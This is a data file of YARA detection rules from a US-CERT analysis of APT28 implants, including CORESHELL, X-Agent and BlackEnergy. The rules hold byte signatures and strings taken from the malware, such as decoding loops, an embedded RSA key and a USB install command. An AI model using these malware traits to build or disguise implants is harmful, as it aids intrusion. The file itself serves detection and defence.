  "IMPLANT_1_v6": "rule IMPLANT_1_v6 {\n   meta:\n      description = \"Downrage Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $XORopcodes_eax = { 35 (22 07 15 0e|56 d7 a7 0a) }\n      $XORopcodes_others = { 81 (F1|F2|F3|F4|F5|F6|F7) (22 07 15 0E|56 D7 A7 0A) }\n   condition:\n      (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or\n      uint32(0) == 0x46445025) and any of them\n}",
  "IMPLANT_1_v7": "rule IMPLANT_1_v7 {\n   meta:\n      description = \"Downrage Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $XOR_FUNCT = { C7 45 ?? ?? ?? 00 10 8B 0E 6A ?? FF 75 ?? E8 ?? ?? FF FF }\n   condition:\n      (uint16(0) == 0x5A4D) and all of them\n}",
  "IMPLANT_2_v1": "rule IMPLANT_2_v1 {\n   meta:\n      description = \"CORESHELL/SOURFACE Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $STR1 = { 8d ?? fa [2] e8 [2] FF FF C7 [2-5] 00 00 00 00 8D [2-5] 5? 6a 00 6a 01}\n   condition:\n      (uint16(0) == 0x5A4D) and all of them\n}",
  "IMPLANT_2_v2": "rule IMPLANT_2_v2 {\n   meta:\n      description = \"CORESHELL/SOURFACE Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $STR1 = { 83 ?? 06 [7-17] fa [0-10] 45 [2-4] 48 [2-4] e8 [2] FF FF [6-8]\n         48 8d [3] 48 89 [3] 45 [2] 4? [1-2] 01}\n   condition:\n      (uint16(0) == 0x5A4D) and all of them\n}",
  "IMPLANT_2_v3": "rule IMPLANT_2_v3 {\n   meta:\n      description = \"CORESHELL/SOURFACE Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $STR1 = {C1 EB 07 8D ?? 01 32 1C ?? 33 D2 }\n      $STR2 = {2B ?? 83 ?? 06 0F 83 ?? 00 00 00 EB 02 33 }\n      $STR3 = {89 ?? ?? 89 ?? ?? 89 55 ?? 89 45 ?? 3B ?? 0F 83 ?? 00 00 00 8D\n         ?? ?? 8D ?? ?? FE }\n   condition:\n      (uint16(0) == 0x5A4D) and any of them\n}",
  "IMPLANT_2_v4": "rule IMPLANT_2_v4 {\n   meta:\n      description = \"CORESHELL/SOURFACE Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $STR1 = {55 8b ec 6a fe 68 [4] 68 [4] 64 A1 00 00 00 00 50 83 EC 0C 53\n         56 57 A1 [4] 31 45 F8 33 C5 50 8D 45 F0 64 A3 00 00 00 00 [8-14] 68\n         [4] 6a 01 [1-2] FF 15 [4] FF 15 [4] 3D B7 00 00 00 75 27}\n   condition:\n      (uint16(0) == 0x5A4D) and all of them\n}",
  "IMPLANT_2_v5": "rule IMPLANT_2_v5 {\n   meta:\n      description = \"CORESHELL/SOURFACE Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $STR1 = {48 83 [2] 48 89 [3] c7 44 [6] 4c 8d 05 [3] 00 BA 01 00 00 00 33\n         C9 ff 15 [2] 00 00 ff 15 [2] 00 00 3D B7 00 00 00 75 ?? 48 8D 15 ?? 00\n         00 00 48 8B CC E8}\n   condition:\n      (uint16(0) == 0x5A4D) and all of them\n}",
  "IMPLANT_2_v6": "rule IMPLANT_2_v6 {\n   meta:\n      description = \"CORESHELL/SOURFACE Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $STR1 = { e8 [2] ff ff 8b [0-6] 00 04 00 00 7F ?? [1-2] 00 02 00 00 7F\n         ?? [1-2] 00 01 00 00 7F ?? [1-2] 80 00 00 00 7F ?? 83 ?? 40 7F}\n   condition:\n      (uint16(0) == 0x5A4D) and all of them\n}",
  "IMPLANT_2_v7": "rule IMPLANT_2_v7 {\n   meta:\n      description = \"CORESHELL/SOURFACE Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $s1 = {10 A0 FA FD 83 3D 28 D4 1F FF 77 5? ?8 B4 50 CC 1E B0 78 D7 90 13\n         21 C0 23 3D 28 BC 78 95 DE 4B B0 60 00 00 0F 7F 38 B4 50 C8 D5 9F E0\n         25 DF F3 21 C0 28 BC 13 3D 2B 90 60 00 00 0F 7F 18 B4 50 C8 BC F2 21\n         C0 28 B4 5E 48 B5 5E 00 8D 41 FE 83 F8 06 8B 45 ?? 72 ?? 8B 4D ?? 8B }\n      $s2 = {28 D9 B0 00 00 00 00 FB 65 C0 AF E8 D3 40 28 B4 5? ?0 3C 20 FA FD\n         88 D7 A0 18 D4 2F F3 3D 2F 77 5? ?C 1E B0 78 BC 73 21 C0 A3 3D 2B 90\n         60 00 00 0F 7F 18 A4 D? ?8 B4 50 C8 0E 90 20 24 D? ?3 20 C0 28 B4 5?\n         ?3 3D 2F 77 5? ?8 B4 50 C2 20 C0 28 BD 70 2D 93 01 E8 B4 D0 C8 D4 2F\n         E3 B4 5E 88 B4 5? ?8 95 5? ?7 2A 05 F5 E5 B8 BE 55 DC 20 80 }\n   condition:\n      (uint16(0) == 0x5A4D) and any of them\n}",
  "IMPLANT_2_v8": "rule IMPLANT_2_v8 {\n   meta:\n      description = \"CORESHELL/SOURFACE Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $STR1 = {8B ?? 44 89 44 24 60 41 F7 E0 8B F2 B8 AB AA AA AA C1 EE 02 89\n         74 24 58 44 8B ?? 41 F7 ?? 8B CA BA 03 00 00 00 C1 E9 02 89 0C 24 8D\n         04 49 03 C0 44 2B ?? 44 89 ?? 24 04 3B F1 0F 83 ?? 01 00 00 8D 1C 76\n         4C 89 6C 24 }\n      $STR2 = {C5 41 F7 E0 ?? ?? ?? ?? ?? ?? 8D 0C 52 03 C9 2B C1 8B C8 ?? 8D\n         04 ?? 46 0F B6 0C ?? 40 02 C7 41 8D 48 FF 44 32 C8 B8 AB AA AA AA F7\n         E1 C1 EA 02 8D 04 52 03 C0 2B C8 B8 AB AA AA AA 46 22 0C ?? 41 8D 48\n         FE F7 E1 C1 EA 02 8D 04 52 03 C0 2B C8 8B C1 }\n      $STR3 = {41 F7 E0 C1 EA 02 41 8B C0 8D 0C 52 03 C9 2B C1 8B C8 42 8D 04\n         1B 46 0F B6 0C ?? 40 02 C6 41 8D 48 FF 44 32 C8 B8 AB AA AA AA F7 E1\n         C1 EA 02 8D 04 52 03 C0 2B C8 B8 AB AA AA AA }\n      $STR4 = {46 22 0C ?? 41 8D 48 FE F7 E1 C1 EA 02 8D 04 52 8B 54 24 58 03\n         C0 2B C8 8B C1 0F B6 4F FF 42 0F B6 04 ?? 41 0F AF CB C1 }\n   condition:\n      (uint16(0) == 0x5A4D) and any of them\n}",
  "IMPLANT_2_v9": "rule IMPLANT_2_v9 {\n   meta:\n      description = \"CORESHELL/SOURFACE Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $STR1 = { 8A C3 02 C0 02 D8 8B 45 F8 02 DB 83 C1 02 03 45 08 88 5D 0F 89\n         45 E8 8B FF 0F B6 5C 0E FE 8B 45 F8 03 C1 0F AF D8 8D 51 01 89 55 F4\n         33 D2 BF 06 00 00 00 8D 41 FF F7 F7 8B 45 F4 C1 EB 07 32 1C 32 33 D2\n         F7 F7 8A C1 02 45 0F 2C 02 32 04 32 33 D2 88 45 FF 8B C1 8B F7 F7 F6\n         8A 45 FF 8B 75 14 22 04 32 02 D8 8B 45 E8 30 1C 08 8B 4D F4 8D 51 FE\n         3B D7 72 A4 8B 45 E4 8B 7D E0 8B 5D F0 83 45 F8 06 43 89 5D F0 3B D8\n         0F 82 ?? ?? ?? ?? 3B DF 75 13 8D 04 7F 8B 7D 10 03 C0 2B F8 EB 09 33\n         C9 E9 5B FF FF FF 33 FF 3B 7D EC 0F 83 ?? ?? ?? ?? 8B 55 08 8A CB 02\n         C9 8D 04 19 02 C0 88 45 13 8D 04 5B 03 C0 8D 54 10 FE 89 45 E0 8D 4F\n         02 89 55 E4 EB 09 8D 9B 00 00 00 00 8B 45 E0 0F B6 5C 31 FE 8D 44 01\n         FE 0F AF D8 8D 51 01 89 55 0C 33 D2 BF 06 00 00 00 8D 41 FF F7 F7 8B\n         45 0C C1 EB 07 32 1C 32 33 D2 F7 F7 8A C1 02 45 13 2C 02 32 04 32 33\n         D2 88 45 0B 8B C1 8B F7 F7 F6 8A 45 0B 8B 75 14 22 04 32 02 D8 8B 45\n         E4 30 1C 01 8B 4D 0C }\n   condition:\n      (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or\n      uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}",
  "IMPLANT_2_v10": "rule IMPLANT_2_v10 {\n   meta:\n      description = \"CORESHELL/SOURFACE Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $STR1 = { 83 ?? 06 [7-17] fa [0-10] 45 [2-4] 48 [2-4] e8 [2] FF FF [6-8]\n         48 8d [3] 48 89 [3] 45 [2] 4? [1-2] 01}\n   condition:\n      (uint16(0) == 0x5A4D) and all of them\n}",
  "IMPLANT_2_v11": "rule IMPLANT_2_v11 {\n   meta:\n      description = \"CORESHELL/SOURFACE Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $STR1 = {55 8b ec 6a fe 68 [4] 68 [4] 64 A1 00 00 00 00 50 83 EC 0C 53\n         56 57 A1 [4] 31 45 F8 33 C5 50 8D 45 F0 64 A3 00 00 00 00 [8-14] 68\n         [4] 6a 01 [1-2] FF 15 [4] FF 15 [4] 3D B7 00 00 00 75 27}\n   condition:\n      (uint16(0) == 0x5A4D) and all of them\n}",
  "IMPLANT_2_v12": "rule IMPLANT_2_v12 {\n   meta:\n      description = \"CORESHELL/SOURFACE Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $STR1 = {48 83 [2] 48 89 [3] c7 44 [6] 4c 8d 05 [3] 00 BA 01 00 00 00\n         33 C9 ff 15 [2] 00 00 ff 15 [2] 00 00 3D B7 00 00 00 75 ?? 48 8D 15\n         ?? 00 00 00 48 8B CC E8}\n   condition:\n      (uint16(0) == 0x5A4D) and all of them\n}",
  "IMPLANT_2_v13": "rule IMPLANT_2_v13 {\n   meta:\n      description = \"CORESHELL/SOURFACE Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $STR1 = { 83 ?? 06 [7-17] fa [0-10] 45 [2-4] 48 [2-4] e8 [2] FF FF\n         [6-8] 48 8d [3] 48 89 [3] 45 [2] 4? [1-2] 01}\n   condition:\n      (uint16(0) == 0x5A4D) and all of them\n}",
  "IMPLANT_2_v14": "rule IMPLANT_2_v14 {\n   meta:\n      description = \"CORESHELL/SOURFACE Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $STR1 = {8B ?? 44 89 44 24 60 41 F7 E0 8B F2 B8 AB AA AA AA C1 EE 02 89\n         74 24 58 44 8B ?? 41 F7 ?? 8B CA BA 03 00 00 00 C1 E9 02 89 0C 24 8D\n         04 49 03 C0 44 2B ?? 44 89 ?? 24 04 3B F1 0F 83 ?? 01 00 00 8D 1C 76\n         4C 89 6C 24  }\n      $STR2 = {C5 41 F7 E0 ?? ?? ?? ?? ?? ?? 8D 0C 52 03 C9 2B C1 8B C8 ?? 8D\n         04 ?? 46 0F B6 0C ?? 40 02 C7 41 8D 48 FF 44 32 C8 B8 AB AA AA AA F7\n         E1 C1 EA 02 8D 04 52 03 C0 2B C8 B8 AB AA AA AA 46 22 0C ?? 41 8D 48\n         FE F7 E1 C1 EA 02 8D 04 52 03 C0 2B C8 8B C1 }\n      $STR3 = {41 F7 E0 C1 EA 02 41 8B C0 8D 0C 52 03 C9 2B C1 8B C8 42 8D 04\n         1B 46 0F B6 0C ?? 40 02 C6 41 8D 48 FF 44 32 C8 B8 AB AA AA AA F7 E1\n         C1 EA 02 8D 04 52 03 C0 2B C8 B8 AB AA AA AA }\n      $STR4 = {46 22 0C ?? 41 8D 48 FE F7 E1 C1 EA 02 8D 04 52 8B 54 24 58 03\n         C0 2B C8 8B C1 0F B6 4F FF 42 0F B6 04 ?? 41 0F AF CB C1 }\n   condition:\n      (uint16(0) == 0x5A4D) and any of them\n}",
  "IMPLANT_2_v15": "rule IMPLANT_2_v15 {\n   meta:\n      description = \"CORESHELL/SOURFACE Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $XOR_LOOP1 = { 32 1C 02 33 D2 8B C7 89 5D E4 BB 06 00 00 00 F7 F3 }\n      $XOR_LOOP2 = { 32 1C 02 8B C1 33 D2 B9 06 00 00 00 F7 F1 }\n      $XOR_LOOP3 = { 02 C3 30 06 8B 5D F0 8D 41 FE 83 F8 06 }\n   condition:\n      (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or\n      uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}",
  "IMPLANT_2_v16": "rule IMPLANT_2_v16 {\n   meta:\n      description = \"CORESHELL/SOURFACE Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $OBF_FUNCT = { 0F B6 1C 0B 8D 34 08 8D 04 0A 0F AF D8 33 D2 8D 41 FF F7\n         75 F8 8B 45 0C C1 EB 07 8D 79 01 32 1C 02 33 D2 8B C7 89 5D E4 BB 06\n         00 00 00 F7 F3 8B 45 0C 8D 59 FE 02 5D FF 32 1C 02 8B C1 33 D2 B9 06\n         00 00 00 F7 F1 8B 45 0C 8B CF 22 1C 02 8B 45 E4 8B 55 E0 02 C3 30 06\n         8B 5D F0 8D 41 FE 83 F8 06 8B 45 DC 72 9A }\n   condition:\n      (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or\n      uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and $OBF_FUNCT\n}",
  "IMPLANT_2_v17": "rule IMPLANT_2_v17  {\n   meta:\n      description = \"CORESHELL/SOURFACE Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $STR1 = { 24108b44241c894424148b4424246836 }\n      $STR2 = { 518d4ddc516a018bd08b4de4e8360400 }\n      $STR3 = { e48178061591df75740433f6eb1a8b48 }\n      $STR4 = { 33d2f775f88b45d402d903c641321c3a }\n      $STR5 = { 006a0056ffd083f8ff74646a008d45f8 }\n   condition:\n      (uint16(0) == 0x5A4D) and 2 of them\n}",
  "IMPLANT_2_v18": "rule IMPLANT_2_v18 {\n   meta:\n      description = \"CORESHELL/SOURFACE Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $STR1 = { 8A C1 02 C0 8D 1C 08 8B 45 F8 02 DB 8D 4A 02 8B 55 0C 88 5D FF\n         8B 5D EC 83 C2 FE 03 D8 89 55 E0 89 5D DC 8D 49 00 03 C1 8D 34 0B 0F\n         B6 1C 0A 0F AF D8 33 D2 8D 41 FF F7 75 F4 8B 45 0C C1 EB 07 8D 79 01\n         32 1C 02 33 D2 8B C7 89 5D E4 BB 06 00 00 00 F7 F3 8B 45 0C 8D 59 FE\n         02 5D FF 32 1C 02 8B C1 33 D2 B9 06 00 00 00 F7 F1 8B 45 0C 8B CF 22\n         1C 02 8B 45 E4 8B 55 E0 02 C3 30 06 8B 5D DC 8D 41 FE 83 F8 06 8B 45\n         F8 72 9B 8B 4D F0 8B 5D D8 8B 7D 08 8B F0 41 83 C6 06 89 4D F0 89 75\n         F8 3B 4D D4 0F 82 ?? ?? ?? ?? 8B 55 E8 3B CB 75 09 8D 04 5B 03 C0 2B\n         F8 EB 02 33 FF 3B FA 0F 83 ?? ?? ?? ?? 8B 5D EC 8A C1 02 C0 83 C3 FE\n         8D 14 08 8D 04 49 02 D2 03 C0 88 55 0B 8D 48 FE 8D 57 02 03 C3 89 4D\n         D4 8B 4D 0C 89 55 F8 89 45 D8 EB 06 8D 9B 00 00 00 00 0F B6 5C 0A FE\n         8D 34 02 8B 45 D4 03 C2 0F AF D8 8D 7A 01 8D 42 FF 33 D2 F7 75 F4 C1\n         EB 07 8B C7 32 1C 0A 33 D2 B9 06 00 00 00 F7 F1 8A 4D F8 8B 45 0C 80\n         E9 02 02 4D 0B 32 0C 02 8B 45 F8 33 D2 F7 75 F4 8B 45 0C 22 0C 02 8B\n         D7 02 D9 30 1E 8B 4D 0C 8D 42 FE 3B 45 E8 }\n   condition:\n      (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or\n      uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}",
  "IMPLANT_2_v19": "rule IMPLANT_2_v19 {\n   meta:\n      description = \"CORESHELL/SOURFACE Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $obfuscated_RSA1 = { 7C 41 B4 DB ED B0 B8 47 F1 9C A1 49 B6 57 A6 CC D6\n         74 B5 52 12 4D FC B1 B6 3B 85 73 DF AB 74 C9 25 D8 3C EA AE 8F 5E D2\n         E3 7B 1E B8 09 3C AF 76 A1 38 56 76 BB A0 63 B6 9E 5D 86 E4 EC B0 DC\n         89 1E FA 4A E5 79 81 3F DB 56 63 1B 08 0C BF DC FC 75 19 3E 1F B3 EE\n         9D 4C 17 8B 16 9D 99 C3 0C 89 06 BB F1 72 46 7E F4 0B F6 CB B9 C2 11\n         BE 5E 27 94 5D 6D C0 9A 28 F2 2F FB EE 8D 82 C7 0F 58 51 03 BF 6A 8D\n         CD 99 F8 04 D6 F7 F7 88 0E 51 88 B4 E1 A9 A4 3B }\n      $cleartext_RSA1 = { 06 02 00 00 00 A4 00 00 52 53 41 31 00 04 00 00 01\n         00 01 00 AF BD 26 C9 04 65 45 9F 0E 3F C4 A8 9A 18 C8 92 00 B2 CC 6E\n         0F 2F B2 71 90 FC 70 2E 0A F0 CA AA 5D F4 CA 7A 75 8D 5F 9C 4B 67 32\n         45 CE 6E 2F 16 3C F1 8C 42 35 9C 53 64 A7 4A BD FA 32 99 90 E6 AC EC\n         C7 30 B2 9E 0B 90 F8 B2 94 90 1D 52 B5 2F F9 8B E2 E6 C5 9A 0A 1B 05\n         42 68 6A 3E 88 7F 38 97 49 5F F6 EB ED 9D EF 63 FA 56 56 0C 7E ED 14\n         81 3A 1D B9 A8 02 BD 3A E6 E0 FA 4D A9 07 5B E6 }\n   condition:\n      (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or\n      uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and any of them\n}",
  "IMPLANT_2_v20": "rule IMPLANT_2_v20 {\n   meta:\n      description = \"CORESHELL/SOURFACE Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $func = { 0F B6 5C 0A FE 8D 34 02 8B 45 D4 03 C2 0F AF D8 8D 7A 01 8D 42\n         FF 33 D2 F7 75 F4 C1 EB 07 8B C7 32 1C 0A 33 D2 B9 06 00 00 00 F7 F1\n         8A 4D F8 8B 45 0C 80 E9 02 02 4D 0B 32 0C 02 8B 45 F8 33 D2 F7 75 F4\n         8B 45 0C 22 0C 02 8B D7 02 D9 30 1E 8B 4D 0C 8D 42 FE 3B 45 E8 8B 45\n         D8 89 55 F8 72 A0 }\n   condition:\n      (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or\n      uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}",
  "IMPLANT_3_v1": "rule IMPLANT_3_v1 {\n   meta:\n      description = \"X-Agent/CHOPSTICK Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $STR1 = \">process isn't exist<\" ascii wide\n      $STR2 = \"shell\\\\open\\\\command=\\\"System Volume Information\\\\USBGuard.exe\\\" install\" ascii wide\n      $STR3 = \"User-Agent: Mozilla/5.0 (Windows NT 6.; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0\" ascii wide\n      $STR4 = \"webhp?rel=psy&hl=7&ai=\" ascii wide\n      $STR5 = {0f b6 14 31 88 55 ?? 33 d2 8b c1 f7 75 ?? 8b 45 ?? 41 0f b6 14\n         02 8a 45 ?? 03 fa}\n   condition:\n      any of them\n}",
  "IMPLANT_3_v2": "rule IMPLANT_3_v2 {\n   meta:\n      description = \"X-Agent/CHOPSTICK Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $base_key_moved = {C7 45 ?? 3B C6 73 0F C7 45 ?? 8B 07 85 C0 C7 45 ?? 74\n         02 FF D0 C7 45 ?? 83 C7 04 3B C7 45 ?? FE 72 F1 5F C7 45 ?? 5E C3 8B\n         FF C7 45 ?? 56 B8 D8 78 C7 45 ?? 75 07 50 E8 C7 45 ?? B1 D1 FF FF C7\n         45 ?? 59 5D C3 8B C7 45 ?? FF 55 8B EC C7 45 ?? 83 EC 10 A1 66 C7 45\n         ?? 33 35}\n      $base_key_b_array = {3B C6 73 0F 8B 07 85 C0 74 02 FF D0 83 C7 04 3B FE\n         72 F1 5F 5E C3 8B FF 56 B8 D8 78 75 07 50 E8 B1 D1 FF FF 59 5D C3 8B\n         FF 55 8B EC 83 EC 10 A1 33 35 }\n   condition:\n      (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or\n      uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and any of them\n}",
  "IMPLANT_3_v3": "rule IMPLANT_3_v3 {\n   meta:\n      description = \"X-Agent/CHOPSTICK Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $STR1 = \".?AVAgentKernel@@\"\n      $STR2 = \".?AVIAgentModule@@\"\n      $STR3 = \"AgentKernel\"\n   condition:\n      (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or\n      uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and any of them\n}",
  "IMPLANT_4_v1": "rule IMPLANT_4_v1 {\n   meta:\n      description = \"BlackEnergy / Voodoo Bear Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $STR1 = {55 8B EC 81 EC 54 01 00 00 83 65 D4 00 C6 45 D8 61 C6 45 D9 64\n         C6 45 DA 76 C6 45 DB 61 C6 45 DC 70 C6 45 DD 69 C6 45 DE 33 C6 45 DF\n         32 C6 45 E0 2EE9 ?? ?? ?? ??} $STR2 = {C7 45 EC 5A 00 00 00 C7 45 E0\n            46 00 00 00 C7 45 E8 5A 00 00 00 C7 45 E4 46 00 00 00}\n   condition:\n      (uint16(0)== 0x5A4D or uint16(0) == 0xCFD0 or uint16(0)== 0xC3D4 or\n      uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and 1 of them\n}",
  "IMPLANT_4_v2": "rule IMPLANT_4_v2 {\n   meta:\n      description = \"BlackEnergy / Voodoo Bear Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $BUILD_USER32 = {75 73 65 72 ?? ?? ?? 33 32 2E 64}\n      $BUILD_ADVAPI32 = {61 64 76 61 ?? ?? ?? 70 69 33 32}\n      $CONSTANT = {26 80 AC C8}\n   condition:\n      (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or\n      uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}",
  "IMPLANT_4_v3": "rule IMPLANT_4_v3 {\n   meta:\n      description = \"BlackEnergy / Voodoo Bear Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $a1 = \"Adobe Flash Player Installer\" wide nocase\n      $a3 = \"regedt32.exe\" wide nocase\n      $a4 = \"WindowsSysUtility\" wide nocase\n      $a6 = \"USB MDM Driver\" wide nocase\n      $b1 = {00 05 34 00 00 00 56 00 53 00 5F 00 56 00 45 00 52 00 53 00 49 00\n         4F 00 4E 00 5F 00 49 00 4E 00 46 00 4F 00 00 00 00 00 BD 04 EF FE 00\n         00 01 00 01 00 05 00 88 15 28 0A 01 00 05 00 88 15 28 0A 3F 00 00 00\n         00 00 00 00 04 00 04 00 03 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n         00 5C 04 00 00 01 00 53 00 74 00 72 00 69 00 6E 00 67 00 46 00 69 00\n         6C 00 65 00 49 00 6E 00 66 00 6F 00 00 00 1C 02 00 00 01 00 30 00 30\n         00 31 00 35 00 30 00 34 00 62 00 30 00 00 00 4C 00 16 00 01 00 43 00\n         6F 00 6D 00 70 00 61 00 6E 00 79 00 4E 00 61 00 6D 00 65 00 00 00 00\n         00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F 00 66 00 74 00 20 00 43 00\n         6F 00 72 00 70 00 6F 00 72 00 61 00 74 00 69 00 6F 00 6E 00 00 00 46\n         00 0F 00 01 00 46 00 69 00 6C 00 65 00 44 00 65 00 73 00 63 00 72 00\n         69 00 70 00 74 00 69 00 6F 00 6E 00 00 00 00 00 55 00 53 00 42 00 20\n         00 4D 00 44 00 4D 00 20 00 44 00 72 00 69 00 76 00 65 00 72 00 00 00\n         00 00 3C 00 0E 00 01 00 46 00 69 00 6C 00 65 00 56 00 65 00 72 00 73\n         00 69 00 6F 00 6E 00 00 00 00 00 35 00 2E 00 31 00 2E 00 32 00 36 00\n         30 00 30 00 2E 00 35 00 35 00 31 00 32 00 00 00 4A 00 13 00 01 00 4C\n         00 65 00 67 00 61 